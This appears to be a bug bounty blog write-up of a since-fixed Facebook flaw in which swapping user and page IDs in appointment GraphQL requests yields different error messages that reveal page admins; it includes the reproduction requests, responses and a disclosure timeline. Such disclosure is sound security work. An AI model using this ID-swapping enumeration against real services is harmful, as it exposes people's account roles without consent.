---
title:  "Determine Any Page Admins"
date:   2019-11-26 12:20:15 +0800
categories: Hacking
classes:
  - landing
header:
  teaser: /assets/img/Facebook.jpg
---


Facebook pages can create Appointments. It is possible to determine those with admin page roles by attempting to replace User Id and Page.

## POC 

Victim: USER_ID_A , PAGE_ID_A

Attacker : USER_ID_B , PAGE_ID_B.

USER_ID_C ( User has no role )

## Reprosteps

Request 

```
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com

&variables={"input":{"client_mutation_id":"1","actor_id":"USER_ID_B","action"......"page_id":"PAGE_ID_B",".....":"appointment_calendar"}


```

Response

```
{
   "data": {
      "native_booking_request_status_update": {
         "request": {
            "id": "PAGE_ID_B",
            "page_contact": null
         },
         "show_contact_creation": false
      }
   },
   "extensions": {
      "is_final": true,
      "dtsg_token": null
   }
}
```
Replace PAGE_ID_B -> PAGE_ID_A 

Request 

```
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com

&variables={"input":{"client_mutation_id":"1","actor_id":"USER_ID_B","action"......"page_id":"PAGE_ID_A",".....":"appointment_calendar"}


```
Response

 ```
 severity": "CRITICAL",
          "code": 1357010,
          "api_error_code": -1,
          "summary": "Oops!",
          "description": "Something's gone wrong. We're working to get it fixed as soon as we can.",
          "is_silent": false,
          "is_transient": false,
          "requires_reauth": false,
 ```

Ok Now repeat step 2 replace  USER_ID_B -> USER_ID_A

Request 

```
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com

&variables={"input":{"client_mutation_id":"1","actor_id":"USER_ID_A","action"......"page_id":"PAGE_ID_A",".....":"appointment_calendar"}


```

Response

```
"severity": "CRITICAL",
         "code": 1373034,
         "api_error_code": 200,
         "summary": "Insufficient Permission",
         "description": "You do not have the necessary permission for the specified Page to perform the requested action.",
         "is_silent": false,
         "is_transient": false,
         "requires_reauth": false,
```

See message. 

Replace  USER_ID_A -> USER_ID_C (User role admin -> user has no role)

Request

```
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com

&variables={"input":{"client_mutation_id":"1","actor_id":"USER_ID_C","action"......"page_id":"PAGE_ID_A",".....":"appointment_calendar"}

```

Response

 ```
 severity": "CRITICAL",
          "code": 1357010,
          "api_error_code": -1,
          "summary": "Oops!",
          "description": "Something's gone wrong. We're working to get it fixed as soon as we can.",
          "is_silent": false,
          "is_transient": false,
          "requires_reauth": false,
 ```

## Putting everything together

User has no role  : 

```
"summary": "Oops!",
"description": "Something's gone wrong. We're working to get it fixed as soon as we can.",
```

User role admin : 

```
"summary": "Insufficient Permission",
"description": "You do not have the necessary permission for the specified Page to perform the requested action.",
```

#Timeline

Nov 08, 2019 – Report Sent

Nov 09, 2019 – Confirmation of submission by Facebook

Nov 09, 2019 – Further investigation by Facebook

Nov 14, 2019 – Fixed by Facebook

Nov 14, 2019 – $XXXX Bounty Awarded by Facebook 




